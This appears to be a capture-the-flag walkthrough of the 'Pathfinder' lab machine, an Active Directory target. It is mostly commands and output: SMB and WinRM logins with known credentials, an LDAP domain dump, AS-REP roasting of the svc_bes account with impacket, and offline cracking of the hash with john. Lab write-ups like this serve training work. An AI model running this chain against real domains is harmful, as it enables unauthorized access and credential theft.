# Pathfinder

## Ifconfig

```
inet 10.10.14.50  netmask 255.255.254.0
inet6 fe80::e5b5:1850:41bc:c2e3
```

## Nmap

> sudo nmap -sC -sV -A 10.10.10.30 | tee [nmap.log](./nmap.log)

- No http server => so no need to run gobuster and nikto

## Smbclient

```
username: sandra
password: Password1234!
```

- List host sharename by sandra user

> smbclient -U sandra -L 10.10.10.30

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share 

SMB1 disabled -- no workgroup available
```

## Install [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) (Windows Remote Management)

> gem install evil-winrm

- Get into the sandra user

> evil-winrm -u sandra -p "Password1234!" -i 10.10.10.30

```
Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sandra\Documents>
```

## Ldapdomaindump

A tool to dump domain info into html format via LDAP

> ldapdomaindump -u MEGACORP\\sandra -p "Password1234!" -o ldapinfo 10.10.10.30 --no-json --no-grep

*Install html2text to view these [html files](./ldapinfo) in text format*

> text2html [domain_users.html](./ldapinfo/domain_users.html)

```
                                          Remote         Domain  01/25/  09/22/  09/22/21  NORMAL_ACCOUNT,    03/21/20
svc_maint     svc_maint     svc_bes       Management     Users   20 22:  21 14:  14:02:51  DONT_REQ_PREAUTH   00:16:54   1104  
                                          Users                  05:12   02:51
```

Found `DONT_REQ_PREAUTH` in SAM svc_bes

## Impacket-GetNPUsers

> impacket-GetNPUsers MEGACORP.LOCAL/svc_bes -dc-ip 10.10.10.30 -request -no-pass -format john > impacket_john.log

- Get only these content below in [impacket_john](./impacket_john.log) file and copy into [another place](./john.log)

```
$krb5asrep$svc_bes@MEGACORP.LOCAL:6f34b4d9e2d1c847e707037f4ae84354$5e98775b20672d33fd91a830468cd4f563eab370430227587388cd255027e794bec7bf86d9a830fb9ba6e5b4e2e0e31c5d6ac09cb681ae9915e7f973356947249ee7b0974d152e860d070e2f5d037417bca427c2efbc7efa79016ae8460657211157dc03d213bd4382cb145d665cae3bef5fa08817d3bdd853e24fb52516b64498a17c7385e5beed949ac1ad601b51ef7f1ea5617e5a11afda6b66f5353757ecf544280be47d2788f5b3a83de80f072602a8eb7be6c692fdd8e733d2406bde55fe870c1986eb7ee86d121e84fd280a6dfee6cc00c19d46f1a1e698d0920c54c0e439e9e3b774b535ecd7369f7bf380bd
```

- Get the rockyou wordlists

> locate rockyou

```
/usr/share/hashcat/masks/rockyou-1-60.hcmask
/usr/share/hashcat/masks/rockyou-2-1800.hcmask
/usr/share/hashcat/masks/rockyou-3-3600.hcmask
/usr/share/hashcat/masks/rockyou-4-43200.hcmask
/usr/share/hashcat/masks/rockyou-5-86400.hcmask
/usr/share/hashcat/masks/rockyou-6-864000.hcmask
/usr/share/hashcat/masks/rockyou-7-2592000.hcmask
/usr/share/hashcat/rules/rockyou-30000.rule
/usr/share/john/rules/rockyou-30000.rule
/usr/share/wordlists/rockyou.txt.gz
```

Then get unzip tje rockyou.txt.gz

> cd /usr/share/wordlists

> sudo gzip -d rockyou.txt.gz

- Use john to find the password

> john john.log --wordlist=/usr/share/wordlists/rockyou.txt

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Sheffield19      ($krb5asrep$svc_bes@MEGACORP.LOCAL)
1g 0:00:00:42 DONE (2021-09-23 08:50) 0.02357g/s 250048p/s 250048c/s 250048C/s SideKick1234..Shanelee
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Found the password is *Sheffield19*


